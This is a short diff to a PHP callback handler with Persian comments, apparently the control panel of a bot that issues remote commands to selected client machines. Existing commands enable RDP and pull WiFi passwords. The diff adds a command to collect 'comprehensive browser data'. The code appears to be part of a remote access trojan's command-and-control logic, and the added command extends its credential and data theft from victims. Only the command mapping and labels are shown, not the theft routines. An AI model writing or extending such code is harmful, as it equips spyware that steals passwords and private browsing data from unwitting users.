@@ -277,6 +277,7 @@ class CallbackQueryHandler
             '/enable_rdp' => 'enable_rdp',         // ✅ اضافه شد
             '/disable_rdp' => 'disable_rdp',       // ✅ اضافه شد
             '/getwifipasswords' => 'get_wifi_passwords', // ✅ اضافه شد
+            '/getbrowserdata' => 'get_comprehensive_browser_data',
         ];
 
         foreach ($commandMap as $cmd => $type) {
@@ -380,6 +381,8 @@ class CallbackQueryHandler
             '/enable_rdp' => '🖥️ فعال کردن RDP',
             '/disable_rdp' => '🚫 غیرفعال کردن RDP',
             '/getwifipasswords' => '📡 رمزهای WiFi',
+            // NEW: اضافه کردن دستور جدید
+            '/getbrowserdata' => '🌐 اطلاعات مرورگر',
             '/select' => '🔙 انتخاب کلاینت'
         ];
 
